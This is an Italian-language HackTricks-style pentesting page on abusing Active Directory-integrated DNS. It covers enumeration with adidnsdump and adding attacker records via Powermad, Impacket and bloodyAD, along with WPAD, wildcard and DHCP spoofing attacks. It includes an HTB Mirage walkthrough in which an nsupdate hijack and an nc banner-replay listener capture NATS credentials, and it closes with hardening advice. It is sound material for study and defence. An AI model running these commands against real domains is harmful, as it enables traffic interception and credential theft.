# AD DNS Records

{{#include ../../banners/hacktricks-training.md}}

Di default **qualsiasi utente** in Active Directory può **enumerare tutti i record DNS** nelle zone DNS del Domain o del Forest, simile a un zone transfer (gli utenti possono elencare gli oggetti figli di una zona DNS in un ambiente AD).

Lo strumento [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) consente l'**enumeration** e l'**exporting** di **tutti i record DNS** nella zona per scopi di recon delle reti interne.
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (April 2025) aggiunge output JSON/Greppable (`--json`), risoluzione DNS multi-threaded e supporto per TLS 1.2/1.3 quando si effettua il binding a LDAPS

For more information read [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

---

## Creazione / Modifica dei record (ADIDNS spoofing)

Poiché per impostazione predefinita il gruppo **Authenticated Users** ha il permesso **Create Child** sul zone DACL, qualsiasi account di dominio (o account computer) può registrare record aggiuntivi. Questo può essere utilizzato per traffic hijacking, NTLM relay coercion o perfino full domain compromise.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py è fornito con Impacket ≥0.12.0)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Primitive di attacco comuni

1. **Wildcard record** – `*.<zone>` trasforma il server DNS AD in un responder a livello aziendale simile allo spoofing LLMNR/NBNS. Può essere abusato per catturare hash NTLM o per relayarli a LDAP/SMB. (Richiede che WINS-lookup sia disabilitato.)
2. **WPAD hijack** – aggiungi `wpad` (o un **NS** record che punti a un host dell'attaccante per bypassare la Global-Query-Block-List) e proxy in modo trasparente le richieste HTTP in uscita per raccogliere credenziali. Microsoft ha corretto i bypass wildcard/DNAME (CVE-2018-8320) ma **NS-records still work**.
3. **Stale entry takeover** – rivendica l'indirizzo IP che precedentemente apparteneva a una workstation e la voce DNS associata continuerà a risolversi, consentendo resource-based constrained delegation o attacchi Shadow-Credentials senza toccare affatto il DNS.
4. **DHCP → DNS spoofing** – in una distribuzione Windows DHCP+DNS di default un attaccante non autenticato sulla stessa subnet può sovrascrivere qualsiasi A record esistente (inclusi i Domain Controllers) inviando richieste DHCP forgiate che attivano aggiornamenti DNS dinamici (Akamai “DDSpoof”, 2023). Questo permette un machine-in-the-middle su Kerberos/LDAP e può portare alla presa completa del dominio.
5. **Certifried (CVE-2022-26923)** – modifica il `dNSHostName` di un account macchina che controlli, registra un A record corrispondente, quindi richiedi un certificato per quel nome per impersonare il DC. Strumenti come **Certipy** o **BloodyAD** automatizzano completamente il flusso.

---

### Internal service hijacking via stale dynamic records (NATS case study)

Quando gli aggiornamenti dinamici restano aperti a tutti gli utenti autenticati, **un nome di servizio de-registrato può essere ri-rivendicato e puntato all'infrastruttura dell'attaccante**. The Mirage HTB DC ha esposto l'hostname `nats-svc.mirage.htb` dopo il DNS scavenging, quindi qualsiasi utente con pochi privilegi poteva:

1. **Confermare che il record manca** e ottenere l'SOA con `dig`:
```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```
2. **Ricreare il record** verso un'interfaccia esterna/VPN che controllano:
```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```
3. **Impersonare il servizio plaintext**. I client NATS si aspettano di vedere un banner `INFO { ... }` prima di inviare le credenziali, quindi copiare un banner legittimo dal broker reale è sufficiente per raccogliere i segreti:
```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```
Qualsiasi client che risolve il nome dirottato invierà immediatamente al listener il suo frame JSON `CONNECT` (inclusi `"user"`/`"pass"`) al listener. Eseguire il binario ufficiale `nats-server -V` sull'host dell'attaccante, disabilitarne la redaction dei log, o semplicemente sniffare la sessione con Wireshark restituisce le stesse credenziali in chiaro perché TLS era opzionale.

4. **Pivot with the captured creds** – in Mirage l'account NATS rubato forniva accesso a JetStream, che ha esposto eventi di autenticazione storici contenenti nomi utente/password riutilizzabili di AD.

This pattern applies to every AD-integrated service that relies on unsecured TCP handshakes (HTTP APIs, RPC, MQTT, etc.): once the DNS record is hijacked, the attacker becomes the service.

---

## Rilevamento e hardening

* Negare a **Authenticated Users** il diritto *Create all child objects* sulle zone sensibili e delegare gli aggiornamenti dinamici a un account dedicato usato da DHCP.
* Se sono necessari aggiornamenti dinamici, impostare la zona su **Secure-only** e abilitare **Name Protection** in DHCP in modo che solo l'oggetto computer proprietario possa sovrascrivere il proprio record.
* Monitorare gli ID eventi di DNS Server 257/252 (dynamic update), 770 (zone transfer) e le scritture LDAP a `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Bloccare nomi pericolosi (`wpad`, `isatap`, `*`) con un record intenzionalmente benigno o tramite la Global Query Block List.
* Mantenere i server DNS aggiornati – ad es., bug RCE CVE-2024-26224 e CVE-2024-26231 hanno raggiunto **CVSS 9.8** e sono sfruttabili da remoto contro i Domain Controller.



## Riferimenti

- Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More”  (2018, ancora il riferimento de-facto per gli attacchi wildcard/WPAD)
- Akamai – “Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates” (Dec 2023)
- [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
{{#include ../../banners/hacktricks-training.md}}
